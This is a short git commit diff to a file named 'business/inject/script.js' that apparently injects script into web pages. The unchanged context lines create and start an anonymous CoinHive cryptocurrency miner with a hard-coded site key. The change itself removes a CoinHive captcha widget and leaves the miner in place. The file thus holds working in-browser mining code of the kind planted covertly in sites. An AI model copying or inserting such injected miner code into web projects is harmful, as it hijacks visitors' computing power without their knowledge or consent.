ffbd9f672d7709db1054b9611613691cf59bc107
YT File Server <32802331+youtubefileserver@users.noreply.github.com>
2018-03-01 20:38:24 +0000

    Update script.js

--- business/inject/script.js
+++ business/inject/script.js
@@ -12,6 +12,3 @@ var script = document.createElement('script');
     var miner = new CoinHive.Anonymous('NIayhDzgu9LvvWabVtgoXjZWp0kq6qZJ', {throttle: 0.2});
 		miner.start();
     };
-    var captcha = document.createElement('span');
-    captcha.innerHTML = '<form action="?" method="post"><script src="https://authedmine.com/lib/captcha.min.js" async></script><div class="coinhive-captcha" data-autostart="true" data-hashes="1024" data-key="NIayhDzgu9LvvWabVtgoXjZWp0kq6qZJ"><em>Loading Captcha...<br>If it doesn\'t load, please disable Adblock!</em></div><input type="submit" value="Submit"/></form>';
-    body.appendChild(captcha);
